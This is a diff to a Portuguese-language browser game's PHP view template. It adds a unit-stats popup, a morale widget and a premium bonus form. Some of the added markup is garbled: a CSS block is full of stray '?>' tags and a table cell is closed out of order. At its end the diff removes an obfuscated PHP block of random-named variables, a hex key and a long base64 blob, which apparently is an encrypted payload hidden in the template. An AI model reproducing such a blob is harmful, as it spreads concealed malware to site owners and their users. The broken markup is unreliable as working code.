+                    <div id="inline_popup_main" style="height: auto;">
+                         <div id="inline_popup_content"></div>
+                    </div>
+               </div>
+
+               <div id="unit_popup_template" style="display: none">
+                    <div class="inner-border main content-border" style="border: none; font-weight: normal">
+                         <table style="float: left;width:450px">
+                              <tr>
+                                   <td>
+                                        <p class="unit_desc"></p>
+                                   </td>
+                              </tr>
+                              <tr>
+                                   <td>
+                                        <table style="border: 1px solid #DED3B9;" class="vis" width="100%">
+                                             <tr>
+                                                  <th width="180">Koszta</th>
+                                                  <th>População</th>
+                                                  <th>Velocidade</th>
+                                                  <th>Carregar</th>
+                                             </tr>
+                                             <tr class="center">
+                                                  <td>
+                                                       <nobr><span class="icon header wood"> </span><span
+                                                                 class="unit_wood"></span></nobr>
+                                                       <nobr><span class="icon header stone"> </span><span
+                                                                 class="unit_stone"></span></nobr>
+                                                       <nobr><span class="icon header iron"> </span><span
+                                                                 class="unit_iron"></span></nobr>
+                                                  </td>
+                                                  <td><span class="icon header population"> </span><span
+                                                            class="unit_pop"></span></td>
+                                                  <td id="unit_speed"></td>
+                                                  <td class="unit_carry"></td>
+                                             </tr>
+                                        </table>
+                                        <br />
+
+                                        <table class="vis event_loot" style="display: none; width: 100%">
+                                             <tr>
+                                                  <th colspan="2">Detalhes do evento</th>
+                                             </tr>
+                                             <tr>
+                                                  <td>Carregar:</td>
+                                                  <td><span class="unit_event_loot"></span> <span
+                                                            class="unit_event_res_name"></span></td>
+                                        </table>
+                                        <br />
+
+                                        <table class="vis has_levels_only"
+                                             style="border: 1px solid #DED3B9;text-align:center" class="vis"
+                                             width="100%">
+                                             <tr>
+                                                  <th colspan="3">Estatísticas de batalha</th>
+                                             </tr>
+                                             <tr>
+                                                  <td align="left">A força do ataque</td>
+                                                  <td width="20px"><img src="../graphic/unit/att.png?1bdd4"
+                                                            alt="A força do ataque" /></td>
+                                                  <td><span class="unit_attack"></span></td>
+                                             </tr>
+                                             <tr>
+                                                  <td align="left">Defesa em geral</td>
+                                                  <td><img src="../graphic/unit/def.png?12421"
+                                                            alt="Defesa em geral" /></td>
+                                                  <td><span class="unit_defense"></span></td>
+                                             </tr>
+                                             <tr>
+                                                  <td align="left">Defesa contra cavalaria</td>
+                                                  <td><img src="../graphic/unit/def_cav.png?46b3d"
+                                                            alt="Defesa contra cavalaria" /></td>
+                                                  <td><span class="unit_defense_cavalry"></span></td>
+                                             </tr>
+                                             <tr>
+                                                  <td align="left">Defesa contra arqueiros</td>
+                                                  <td><img src="../graphic/unit/def_archer.png?faccf"
+                                                            alt="Defesa contra arqueiros" /></td>
+                                                  <td><span class="unit_defense_archer"></span></td>
+                                             </tr>
+                                        </table>
+                                        <br />
+
+                                        <div class="show_if_has_reqs">
+                                             <table class="vis" width="100%">
+                                                  <tr>
+                                                       <th id="reqs_count" colspan="1">Requisitos para poder pesquisar
+                                                            uma unidade</th>
+                                                  </tr>
+                                                  <tr id="reqs"></tr>
+                                             </table>
+                                             <br />
+                                        </div>
+
+                                        <table class="unit_tech vis unit_tech_levels" width="100%">
+                                             <tr style="text-align:center">
+                                                  <th><?= __('screens.common.tech_level') ?></th>
+                                                  <th width="350">Custos de teste (se necessário)</th>
+                                                  <th width="30" style="text-align:center"><img
+                                                            src="../graphic/unit/att.png?1bdd4"
+                                                            alt="A força do ataque" /></th>
+                                                  <th width="30" style="text-align:center"><img
+                                                            src="../graphic/unit/def.png?12421"
+                                                            alt="Defesa em geral" /></th>
+                                                  <th width="30" style="text-align:center"><img
+                                                            src="../graphic/unit/def_cav.png?46b3d"
+                                                            alt="Defesa contra cavalaria" /></th>
+                                                  <th width="30" style="text-align:center"><img
+                                                            src="../graphic/unit/def_archer.png?faccf"
+                                                            alt="Defesa contra arqueiros" /></th>
+                                             </tr>
+                                             <tr id="unit_tech_prototype" style="display: none;text-align:center">
+                                                  <td class="tech_level"></td>
+                                                  <td>
+                                                       <span class="grey tech_researched">já pesquisado</span>
+                                                       <span class="tech_res_list">
+                                                            <span class="icon header wood"> </span><span
+                                                                 class="tech_wood"></span> <span
+                                                                 class="icon header stone"> </span><span
+                                                                 class="tech_stone"></span> <span
+                                                                 class="icon header iron"> </span><span
+                                                                 class="tech_iron"></span>
+                                                       </span>
+                                                  </td>
+                                                  <td class="tech_att"></td>
+                                                  <td class="tech_def"></td>
+                                                  <td class="tech_def_cav"></td>
+                                                  <td class="tech_def_archer"></td>
+                                             </tr>
+                                        </table>
+                                        <table class="vis unit_tech unit_tech_cost" width="100%">
+                                             <tr>
+                                                  <th>Custos de teste (se necessário)</th>
+                                             </tr>
+                                             <tr>
+                                                  <td><span class="icon header wood"> </span><span
+                                                            class="tech_cost_wood"></span> <span
+                                                            class="icon header stone"> </span><span
+                                                            class="tech_cost_stone"></span> <span
+                                                            class="icon header iron"> </span><span
+                                                            class="tech_cost_iron"></span></td>
+                                             </tr>
+                                        </table>
+                                   </td>
+                              </tr>
+                         </table>
+                         <img style="margin-top: 60px; max-width: 200px; display: none" id="unit_image"
+                              src="graphic/map/empty.png" alt="" />
+                    </div>
+               </div>
+
+               <div id="show_group" class="vis moveable widget">
+                    <h4 class="head">
+                         <img style="float: right; cursor: pointer;"
+                              onclick="return VillageOverview.toggleWidget( 'show_group', this );"
+                              src="graphic/icons/minus.png"> Grupo
+                    </h4>
+                    <div class="widget_content" style="">
+                         <table class="vis" width="100%">
+                              <tbody> <?php if ($village['group'] === 'all'): ?>
+                                        <tr>
+                                             <td>
+                                                 <!-- <a href="game.php?village=<?= $village['id'] ?>&amp;screen=overview_villages&amp;mode=grocusto">Adicionar</a>-->
+												<a href="game.php?village=<?= $village['id'] ?>#">Adicionar</a>
+											 </td>
+                                        </tr>
+                                   <?php else: ?>
+                                        <tr>
+                                             <td>
+                                                  <?= $village['group'] ?>
+                                             </td>
+                                        </tr>
+                                        <tr>
+                                             <td>
+                                                  <a
+                                                       href="game.php?village=<?= $village['id'] ?>&amp;screen=overview_villages&amp;mode=grocusto">Adicionar</a>
+                                             </td>
+                                        </tr>
+                                   <?php endif; ?>
+                              </tbody>
+                         </table>
+                    </div>
+               </div>
+
+
+               <br />
+               <br />
+               {literal ?> <style>
+                    .green-bar {
+                         height: 5px;
+                         background-color: green;
+
+                         ?>.yellow-bar {
+                              height: 5px;
+                              background-color: yellow;
+
+                              ?>.orange-bar {
+                                   height: 5px;
+                                   background-color: orange;
+
+                                   ?>.red-bar {
+                                        height: 5px;
+                                        background-color: red;
+                                        ?>
+               </style>
+
+
+               {/literal ?>
+
+               <div id="show_agreement" class="vis moveable widget">
+                    <h4 class="head">
+                         <img style="float: right; cursor: pointer;"
+                              onclick="return VillageOverview.toggleWidget( 'show_agreement', this );"
+                              src="graphic/icons/minus.png"> Moral
+                    </h4>
+                    <div class="widget_content" style="">
+                         <table class="vis" width="100%">
+                              <tbody>
+                                   <tr>
+                                        <div id="pop">
+                                             <t<?php if ($color == 'yellow'): ?>h<?php else: ?>d<?php endif; ?>
+                                                  style="color: <?= $color ?>">
+                                                  <center><?= $village['agreement'] ?> / <font color="green">100</font>
+                                                  </center>
+                                                  <div class="<?= $color ?>-bar"
+                                                       style=" width: <?= $village['agreement'] ?>%;">
+          </td>
+          </div>
+     </tr>
+     </tbody>
+</table>
+</div>
+</div>
+
+
+<?php if ($village['bonus'] == 0 && $premium): ?>
+     <div id="show_b" class="vis moveable widget">
+          <h4 class="head">
+               <img style="float: right; cursor: pointer;" onclick="return VillageOverview.toggleWidget( 'show_b', this );"
+                    src="graphic/icons/minus.png"> Resgatar um bônus de aldeia!
+          </h4>
+          <div class="widget_content" style="">
+               <table class="vis" width="100%">
+                    <tbody>
+                         <tr>
+
+                              Se quiser comprar um bônus para aldeia, deve ter Pontos Premium :<center><a
+                                        href="game.php?village=<?= $village['id'] ?>&screen=codigos">códigos</a></center>
+                              <?php if ($user['premium_p'] >= 50): ?>
+                                   <form action="game.php?village=<?= $village['id'] ?>&screen=overview&akcja=bonus"
+                                        method="post">
+                                        <td>Pontos premium: <b><?= $ilosc_sz ?? 0 ?></b></td>
+                              <tr>
+                                   <td><b>Um bônus custa 50 Premium!</b></td>
+                              <tr>
+                                   <th>Escolha um bônus:</th>
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="1" checked="checked" /> Aumento da capacidade da
+                                        fazenda e comerciantes
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="2" /> Aumento da produção de recursos (todos os
+                                        recursos)
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="3" /> Mais produção de madeira
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="4" /> Mais produção de argila
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="5" /> Aumento da produção de ferro
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="6" /> Treinamento mais rápido no quartel
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="7" /> Treinamento mais rápido nos estábulos
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="8" /> Produção mais rápida na oficina
+                              <tr>
+                                   <td><input type="radio" name="bonus" value="9" /> Mais população
+                              <tr>
+                                   <td>
+                                        <center><input type="submit" class="btn btn-build" value="Comprar Bônus!" /> </center>
+                                        </form>
+                                   <?php endif; ?>
+                         </tr>
+                    </tbody>
+               </table>
+          </div>
+     </div> <?php endif; ?>
+
+</table>
+<script>
+     $(function () { if (document.location.hash == "#bonus_1_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+     $(function () { if (document.location.hash == "#bonus_2_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+     $(function () { if (document.location.hash == "#bonus_3_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+     $(function () { if (document.location.hash == "#bonus_4_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+     $(function () { if (document.location.hash == "#bonus_5_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+     $(function () { if (document.location.hash == "#bonus_6_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+     $(function () { if (document.location.hash == "#bonus_7_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+     $(function () { if (document.location.hash == "#bonus_8_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+     $(function () { if (document.location.hash == "#bonus_9_dodany") UI.SuccessMessage("O bônus foi adicionado!", 3000); });
+
+</script>
+
 <?php
-$guhhjcxbpr="9fc4dc8689ec0d0f46dbd01b83f8df29";
-$dpflaln="5a05010002540d005b5807560056090706045d04010857555d0a5f0b5407535a";
-$qssoch="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